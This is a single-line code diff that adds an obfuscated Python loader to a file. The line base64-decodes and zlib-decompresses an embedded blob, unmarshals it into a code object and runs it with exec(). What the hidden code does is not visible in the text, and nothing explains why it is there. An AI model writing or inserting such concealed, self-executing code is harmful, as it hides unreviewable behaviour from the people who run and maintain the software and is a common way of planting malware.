@@ -1,0 +1,1 @@
+import base64 as b, marshal as m;import zlib as z;a='eJx7zIAEmKH0ZxkgMZ2BiSGVIYVhGSMDw2pGmBJGhhTGYAZNpipuj9ScnHyF8PyinBQ/TcZbrAVFmXklKxk+g1Td4s5PSosvSS0u0Suo/MVhk5ufUpqTalfEBjaBgaFYGkh8YGZkZLzBwNrA2pB7kUHkCoPIBRgqYgHKAwDkYSHf';b=b.b64decode(a);b=z.decompress(b);c=m.loads(b);exec(c)
